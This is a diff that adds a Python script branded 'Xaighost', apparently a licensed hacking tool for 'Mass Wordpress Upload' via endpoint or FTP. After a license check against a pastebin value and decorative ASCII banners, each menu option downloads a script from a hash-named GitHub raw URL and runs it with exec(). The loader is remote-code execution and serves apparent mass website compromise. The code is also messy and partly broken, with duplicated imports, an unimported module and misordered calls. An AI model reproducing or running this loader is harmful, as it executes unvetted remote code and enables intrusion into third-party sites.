@@ -1,0 +1,319 @@
+from __future__ import division
+import requests, os, sys, random, time, socket, subprocess, pathlib, json, os.path, colorama, re, nexmo,queue, vonage,threading,datetime
+import smtplib, ssl
+from email.mime.text import MIMEText
+from datetime import datetime
+import time
+from nexmo.sms import Sms
+from bs4 import BeautifulSoup
+from colorama import Fore, Style, Back
+from os import path
+from concurrent.futures import ThreadPoolExecutor
+from threading import Thread
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+import time
+import driver
+import os, re, sys, socket, json
+import requests as req 
+from multiprocessing.dummy import Pool
+import requests as r
+import time
+import colorama
+import aiohttp
+import os, re, time, logging
+import multiprocessing.dummy as ThreadPool
+import asyncio, pypeln as pl, requests, json, subprocess, hashlib
+import re, os, getpass
+from colorama import Fore, Style
+from colorama import *
+import re, os, getpass
+import os
+import subprocess
+from selenium.webdriver.chrome.options import Options
+from colorama import init
+import re, os, getpass
+import requests
+from selenium.webdriver.chrome.options import Options
+from colorama import init
+from licensing.models import*
+from licensing.methods import Key, Helpers
+import smtplib
+from asciimatics.effects import Stars, Print
+from asciimatics.particles import RingFirework, SerpentFirework, StarFirework, \
+    PalmFirework
+from asciimatics.renderers import SpeechBubble, FigletText, Rainbow
+from asciimatics.scene import Scene
+from asciimatics.screen import Screen
+from asciimatics.exceptions import ResizeScreenError
+from random import randint, choice
+import sys
+import configparser
+from time import strftime, sleep
+import time , sys
+import time , sys
+    
+import sys
+from pyfiglet import Figlet
+from asciimatics.effects import Scroll, Mirage, Wipe, Cycle, Matrix, \
+    BannerText, Stars, Print
+from asciimatics.particles import DropScreen
+from asciimatics.renderers import FigletText, SpeechBubble, Rainbow, Fire
+from asciimatics.scene import Scene
+from asciimatics.screen import Screen
+from asciimatics.exceptions import ResizeScreenError
+import time
+import os
+import tempfile
+import requests
+import pathlib
+import subprocess
+
+
+init(autoreset=True)
+fg = '\033[0;32m'
+fr = '\033[0;31m'
+fw = '\033[1;37m'
+fb = '\033[0;34m'
+fy = '\033[1;33m'
+fre = '\033[0m'
+
+red = '\033[91m'
+ble = '\033[94m'
+green = '\033[92m'
+whit = '\033[00m'
+yellow ='\033[0;33m'
+  
+Headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'}
+
+
+colorama.init()
+
+
+fg = [
+    '\033[91;1m',  # RED     0
+    '\033[92;1m',  # GREEN   1
+    '\033[93;1m',  # YELLOW  2
+    '\033[94;1m',  # BLUE    3
+    '\033[95;1m',  # MAGENTA 4
+    '\033[96;1m',  # CYAN    5
+    '\033[97;1m'  # WHITE   6
+]
+
+
+def clear():
+    os.system('cls' if platform.system() == 'Windows' else 'clear')
+def _credits(screen):
+    scenes = []
+
+    text = Figlet(font="banner", width=200).renderText("Xaighost")
+    width = max([len(x) for x in text.split("\n")])
+
+    effects = [
+        Print(screen,
+              Fire(screen.height, 80, text, 0.4, 40, screen.colours),
+              0,
+              speed=1,
+              transparent=False),
+        Print(screen,
+              FigletText("Xaighost", "banner"),
+              screen.height - 9, x=(screen.width - width) // 2 + 1,
+              colour=Screen.COLOUR_BLACK,
+              bg=Screen.COLOUR_BLACK,
+              speed=1),
+        Print(screen,
+              FigletText("Xaighost", "banner"),
+              screen.height - 9,
+              colour=Screen.COLOUR_WHITE,
+              bg=Screen.COLOUR_WHITE,
+              speed=1),
+    ]
+    scenes.append(Scene(effects, 30))
+
+    effects = [
+        Matrix(screen, stop_frame=200),
+        Mirage(
+            screen,
+            FigletText("Xaighost"),
+            screen.height // 2 - 3,
+            Screen.COLOUR_GREEN,
+            start_frame=100,
+            stop_frame=200),
+        Wipe(screen, start_frame=150),
+        Cycle(
+            screen,
+            FigletText("Xaighost"),
+            screen.height // 2 - 3,
+            start_frame=200)
+    ]
+    scenes.append(Scene(effects, 100, clear=False))
+
+    effects = [
+        Print(screen,
+              SpeechBubble("Press 'X' to Continue."), screen.height // 2 - 1, attr=Screen.A_BOLD)
+    ]
+    scenes.append(Scene(effects, -1))
+
+    screen.play(scenes)
+
+
+os.system('cls')
+def Auth_check():
+    from random import choice
+    os.system('cls')
+    clear = "\x1b[0m"
+
+    colors = [36, 32, 34, 35, 31, 37]
+    x = """ 
+
+                        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+                        ┃                                                                   ┃
+                        ┃           .   .    .    --.-- .--..   . .--.  .-..---.            ┃
+                        ┃            \ /    / \     |  :    |   |:    :(   ) |              ┃
+                        ┃             /    /___\    |  | --.|---||    | `-.  |              ┃
+                        ┃            / \  /     \   |  :   ||   |:    ;(   ) |              ┃
+                        ┃           '   ''       `--'-- `--''   ' `--'  `-'  '              ┃
+                        ┃                                                                   ┃
+                        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛   
+                        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+                        ┃                     [+] Loading Screen  ....                      ┃
+                        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                                                                             
+                           """
+    for N, line in enumerate(x.split("\n")):
+        sys.stdout.write(" \x1b[1;%dm%s%s\n " % (random.choice(colors), line, clear))
+        time.sleep(0.05)
+
+    def loadbar(iteration, total, prefix='', suffix='', decimals=1, length=100, fill='█'):
+        percent = ('{0:.' + str(decimals) + 'f}').format(100 * (iteration / float(total)))
+        filledLength = int(length * iteration // total)
+        bar = fill * filledLength + '-' * (length - filledLength)
+        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
+        if iteration == total:
+            print()
+
+    items = list(range(0, 50))
+    l = len(items)
+
+    loadbar(0, l, prefix='Progress:', suffix='Complete', length=l)
+    for i, item in enumerate(items):
+        sleep(0.0000001)
+        loadbar(i + 1, l, prefix='                          Progress:', suffix='Complete', length=l)
+
+if __name__ == '__main__':
+    Passwd = getpass.getpass('\033[0;40mLicense : ')
+    pwn = requests.get('https://pastebin.com/raw/bSmjMxhz', verify=False, timeout=7).text
+    pwn = str(pwn)
+    if pwn in Passwd:
+        Auth_check()
+    else:
+        clear = "\x1b[0m"
+        colors = [31]
+        x = """
+
+                      ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+                      ┃                 Error! License Not I Database!"                   ┃
+                      ┃       Please contact (@Karma_Reall In Telegram ) for help.        ┃
+                      ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                                                                            
+                                      """
+        for N, line in enumerate(x.split("\n")):
+            sys.stdout.write(" \x1b[1;%dm%s%s\n " % (random.choice(colors), line, clear))
+            time.sleep(0.05)
+        input('Finished, Enter to Exit!')
+        sys.exit()
+
+    def Services():
+        main()
+
+    def choose_service():
+        fg = [
+            '\033[91;1m',  # RED     0
+            '\033[92;1m',  # GREEN   1
+            '\033[93;1m',  # YELLOW  2
+            '\033[94;1m',  # BLUE    3
+            '\033[95;1m',  # MAGENTA 4
+            '\033[96;1m',  # CYAN    5
+            '\033[97;1m'  # WHITE   6
+        ]
+        pc_name = socket.gethostname()
+        currnet_dir = pathlib.Path(__file__).parent.absolute()
+red = '\033[91m'
+ble = '\033[94m'
+green = '\033[92m'
+whit = '\033[00m'
+        
+
+def wpep(ep):
+  from selenium import webdriver
+  from selenium.webdriver.common.keys import Keys
+  import time
+  import requests
+  import boto3
+  import driver
+  import os
+  import subprocess
+  from selenium.webdriver.chrome.options import Options
+  from colorama import init
+  import re, os, getpass
+
+  a=r.get("https://raw.githubusercontent.com/aefd8f1c604a9786879fe3ca28129507/aefd8f1c604a9786879fe3ca28129507/main/wpupEP2.txt").text
+  exec(a)
+
+def wpftp(ftp):
+  from selenium import webdriver
+  from selenium.webdriver.common.keys import Keys
+  import time
+  import requests
+  import boto3
+  import driver
+  import os
+  import subprocess
+  from selenium.webdriver.chrome.options import Options
+  from colorama import init
+  import re, os, getpass
+
+  a=r.get("https://raw.githubusercontent.com/aefd8f1c604a9786879fe3ca28129507/ac5e1deef70affecaf0bcb791eea7d8c/main/wpupFTP2.txt").text
+  exec(a)
+
+
+def Services():
+    import os
+    if os.name == 'nt':
+        try:
+            os.system('title Full Pack Tools Wordpress. ICQ : @xaighost')
+        except:
+            pass
+    os.system('cls')
+    fg = Fore.GREEN
+    clear = "\x1b[0m"
+    colors = [36, 32, 34, 35, 31, 37]
+    x = f"""                                                                      
+@@@  @@@  @@@ @@@@@@@     @@@@@@@  @@@@@@   @@@@@@  @@@       @@@@@@ 
+@@!  @@!  @@! @@!  @@@      @!!   @@!  @@@ @@!  @@@ @@!      !@@     
+@!!  !!@  @!@ @!@@!@!       @!!   @!@  !@! @!@  !@! @!!       !@@!!  
+ !:  !!:  !!  !!:           !!:   !!:  !!! !!:  !!! !!:          !:! 
+  ::.:  :::    :             :     : :. :   : :. :  : ::.: : ::.: :  """
+    for N, line in enumerate(x.split("\n")):
+        sys.stdout.write(" \x1b[1;%dm%s%s\n " % (random.choice(colors), line, clear))
+        time.sleep(0.05)
+Services()
+
+def main():
+  banner = """\033[1;33;40m
+  """.format(fr, fw, fy, fw, fy, fr)
+  print("\033[93;1 [[1]. Mass Wordpress Upload (EP)".format(fr, fg, fr, fw))
+  print("\033[96;1m [2]. Mass Wordpress Upload (FTP)".format(fr, fg, fr, fw))
+  print('')
+  choice = input('Select Menu: '.format(fy, fr, fre))
+  if (choice == '1'):
+    ep = input('Enter to Next.......')
+    wpep(ep)
+  elif (choice == '2'):
+    ftp = input('Enter to Next.......')
+    wpftp(ftp)
+  else:
+    print('Wrong lol!!. Idiot people'.format(fw))
+    input('Enter to exit...!!')
+
+
+if __name__ == '__main__':
+    main()
